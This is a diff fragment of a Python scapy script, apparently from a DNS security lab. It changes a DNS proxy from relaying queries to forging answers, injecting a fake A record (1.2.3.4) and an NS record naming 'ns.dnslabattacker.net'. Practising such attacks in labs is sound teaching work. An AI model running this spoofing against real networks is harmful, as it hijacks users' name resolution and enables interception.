@@ -27,8 +27,9 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 # reuse socket
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-# Bind the socket to the proxy port
-sock.bind(('0.0.0.0', port))
+# Set source
+sock.bind((dns_server, port))
+
 print("DNS Proxy running on port {}".format(port))
 
 def modify_ns_records(packet):
@@ -51,12 +52,10 @@ while True:
         print("Received DNS query from {}".format(addr))
 
         if SPOOF:
-            # Modify the query to target the BIND server
-            query = IP(data) / UDP(dport=dns_port)
-            response = sr1(query, verbose=0)
-            
-            # Modify the BIND server's response
-            modified_response = modify_ns_records(response)
+            modified_response = DNS(data)
+            domain_name = modified_response.qd.qname
+            modified_response[DNS].an = DNSRR(rrname=domain_name, type="A", rdata="1.2.3.4")
+            modified_response[DNS].ns = DNSRR(rrname=domain_name, type="NS", rdata="ns.dnslabattacker.net") 
             # Send the modified response back to the original requester
             sock.sendto(bytes(modified_response), addr)
             print("Sent modified DNS response to {}".format(addr))
